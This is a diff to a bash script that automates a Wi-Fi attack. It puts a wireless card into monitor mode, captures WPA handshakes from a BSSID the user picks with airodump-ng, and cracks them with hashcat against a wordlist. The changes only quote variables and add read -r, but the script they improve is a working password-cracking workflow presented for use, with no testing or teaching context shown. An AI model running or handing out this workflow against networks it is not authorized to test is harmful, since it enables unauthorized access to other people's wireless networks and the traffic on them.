@@ -30,20 +30,20 @@ fi
 interface=$1
 
 # Put wireless interface into monitor mode
-airmon-ng start $interface
+airmon-ng start "$interface"
 
 # Start capturing handshakes
 airodump-ng mon0
 
 # Ask user for BSSID and channel to target
 echo "Please enter the BSSID and channel to target (e.g. XX:XX:XX:XX:XX:XX 6): "
-read bssid channel
+read -r bssid channel
 
 # Set channel for capture
-iwconfig mon0 channel $channel
+iwconfig mon0 channel "$channel"
 
 # Start capturing handshakes for target network
-airodump-ng -c $channel --bssid $bssid -w handshake mon0
+airodump-ng -c "$channel" --bssid "$bssid" -w handshake mon0
 
 # Once handshake is captured, stop capturing and stop monitor mode
 airmon-ng stop mon0
@@ -59,7 +59,7 @@ fi
 
 # Ask user for wordlist to use for cracking
 echo "Please enter the path to the wordlist to use for cracking: "
-read wordlist
+read -r wordlist
 
 # Crack the hash using hashcat
-hashcat -m 2500 handshake*.cap $wordlist
+hashcat -m 2500 handshake*.cap "$wordlist"
